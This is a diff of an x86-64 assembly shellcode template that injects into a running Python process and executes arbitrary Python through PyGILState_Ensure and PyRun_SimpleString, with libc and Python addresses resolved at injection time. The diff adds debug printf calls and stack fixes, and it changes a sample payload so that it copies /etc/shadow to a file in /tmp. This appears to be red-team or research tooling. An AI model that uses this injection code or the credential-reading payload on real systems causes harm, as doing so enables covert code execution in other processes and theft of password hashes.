@@ -4,6 +4,9 @@ _start:
 
 // Based on the stage 2 code included with dlinject.py
 // and in part on https://github.com/lmacken/pyrasite/blob/d0c90ab38a8986527c9c1f24e222323494ab17a2/pyrasite/injector.py
+// relative offsets for the following libraries required:
+//		/usr/bin/pythonN.N (same version as target process)
+//		libc-2.31.so
 cld
 
 	fxsave moar_regs[rip]
@@ -49,12 +52,36 @@ cld
 
 	lea rsp, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
 	
+	// BEGIN: call LIBC printf
+	push rbx
+	lea rsi, [rip]
+	lea rdi, format_hex[rip]
+	xor rax, rax
+	mov rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	//movabsq rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	call rbx
+	pop rbx
+	// END: call LIBC printf
+
+	// BEGIN: call LIBC printf
+	push rbx
+	lea rsi, [old_rip[rip]]
+	lea rdi, format_hex[rip]
+	xor rax, rax
+	mov rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	call rbx
+	pop rbx
+	// END: call LIBC printf
+
+	
 	//debug
+	push rbx
 	mov rax,1 # write to file
 	mov rdi,1 # stdout
 	mov rdx,1 # number of bytes
 	lea rsi, dmsg[rip] #from buffer
 	syscall
+	pop rbx
 	///debug
 
 	# // BEGIN: call Py_Initialize()
@@ -65,22 +92,51 @@ cld
 	# // END: call Py_Initialize()
 
 	//debug
+	push rbx
 	mov rax,1 # write to file
 	mov rdi,1 # stdout
 	mov rdx,1 # number of bytes
 	lea rsi, dmsg[rip] + 1 #from buffer
 	syscall
+	pop rbx
 	///debug
+	
+	// BEGIN: call LIBC printf
+	push rbx
+	push rcx
+	//mov rcx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	//mov rsi, [rcx]
+	movabsq rsi, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	//mov rsi, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	lea rdi, format_hex[rip]
+	xor rax, rax
+	mov rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	//movabsq rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	call rbx
+	pop rcx
+	pop rbx
+	// END: call LIBC printf
+	
+	// BEGIN: call LIBC printf
+	push rbx
+	movabsq rsi, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Ensure:RELATIVEOFFSET]
+	lea rdi, format_hex[rip]
+	xor rax, rax
+	mov rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	//movabsq rbx, [BASEADDRESS:.+/libc-2.31.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	call rbx
+	pop rbx
+	// END: call LIBC printf
 
 	// BEGIN: call PyGILState_Ensure() and store the handle it returns
-	//push rbx
+	push rbx
 	xor rax, rax
-	mov rdi, 0
-	mov rsi, 0
-	mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Ensure:RELATIVEOFFSET]
+	//mov rdi, 0
+	//mov rsi, 0
+	movabsq rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Ensure:RELATIVEOFFSET]
 	call rbx
 	mov varPythonHandle[rip], rax
-	//pop rbx
+	pop rbx
 	// END: call PyGILState_Ensure()
 	
 	//debug
@@ -95,6 +151,7 @@ cld
 	push rbx
 	mov rsi, 0
 	lea rdi, python_code[rip]
+	// allocate stack variable and use it to store the address of the code
 	sub rsp, 8
 	mov [rsp], rdi
 	//mov rax, varPythonHandle[rip]
@@ -102,6 +159,8 @@ cld
 	call rbx
 	//pop rdi
 	pop rbx
+	// discard stack variable
+	add rsp, 8
 	// END: call PyRun_SimpleString("arbitrary Python code here")
 	
 	//debug
@@ -149,6 +208,7 @@ cld
 	mov rax, 0
 
 	fxrstor moar_regs[rip]
+	
 	pop r15
 	pop r14
 	pop r13
@@ -164,13 +224,16 @@ cld
 	pop rcx
 	pop rbx
 	pop rax
+	
 	popf
 
 	mov rsp, [VARIABLE:RSP:VARIABLE]
+	
 	jmp old_rip[rip]
 
 old_rip:
 	.quad [VARIABLE:RIP:VARIABLE]
+	.align 16
 
 old_code:
 	.byte [VARIABLE:CODE_BACKUP_JOIN:VARIABLE]
@@ -189,18 +252,25 @@ python_code1:
 	.ascii "print('OK');\0"
 
 python_code2:
-	.ascii "import os; import sys; finput = open('/opt/tasks/rsd2hd5/code.zip', 'rb'); foutput = open('/tmp/bf3.dat', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();\0"
+	.ascii "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishop_fox.dat', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();\0"
 
 python_code:
 	.ascii "[VARIABLE:pythoncode:VARIABLE]\0"
 
 format_string:
-	.ascii "DEBUG: %s\0"
+	.ascii "DEBUG: %s\n\0"
+	
+format_hex:
+	.ascii "DEBUG: 0x%llx\n\0"
 
 dmsg:
 	.ascii "123456789ABCDEF\0"
 	
 varPythonHandle:
+	.space 8
+	.align 16
+
+varFunctionAddress:
 	.space 8
 	.align 16
 	
